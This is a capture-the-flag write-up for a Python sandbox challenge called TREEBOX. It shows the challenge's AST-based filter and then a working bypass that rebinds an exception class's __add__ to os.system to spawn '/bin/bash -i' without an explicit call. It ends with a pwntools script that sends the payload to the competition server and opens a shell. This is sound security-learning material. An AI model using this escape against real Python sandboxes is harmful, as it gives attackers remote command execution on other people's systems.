## TREEBOX
---
### Attachment

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

---

### Description

This challenge belongs to the sandbox category, and uses python and takes arbitrary python script input from the client and verifies the program with the `verify_secure()` function.

```python
...snip...
def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True
...snip...
```
---
And here we need to pass this function to execute malicious python script to server, and we need to pass 3 walls:
- ast.Import
- ast.ImportFrom
- ast.Call
---
After some time I found [this](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-execution-without-calls) bypass in hacktricks to bypass `call ` and it worked!

```python
# Declare arbitrary exception class
class Klecko(Exception):
  def __add__(self,algo):
    return 1

# Change add function
Klecko.__add__ = os.system

# Generate an object of the class with a try/except + raise
try:__
  raise Klecko
except Klecko as k:
  k + "/bin/bash -i" #RCE abusing __add__
```
---
class `Klecko()` creates a function that `__add__` something and returns 1, but adds the function `os.system` instead, and triggers it with "try except" and appends "/bin/bash -i" to the function of that class have os.system in it? I assume this class is an intermediary between the os.system function and the string "/bin/bash -i" thus producing a function like `os.system('/bin/bash -i')` without calling the `os.system` function. 

---

### Python Solution

```python
import pwn

payload = '''# Declare arbitrary exception class
class Klecko(Exception):
  def __add__(self,algo):
    return 1

# Change add function
Klecko.__add__ = os.system

# Generate an object of the class with a try/except + raise
try:
  raise Klecko
except Klecko as k:
  k + "/bin/bash -i" #RCE abusing __add__
--END'''
p = pwn.remote('treebox.2022.ctfcompetition.com', 1337)
p.recv(1024)
p.sendline(payload)
p.interactive()
```

I just added it to the payload and here we got the shell :)

---
### Reference
- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-execution-without-calls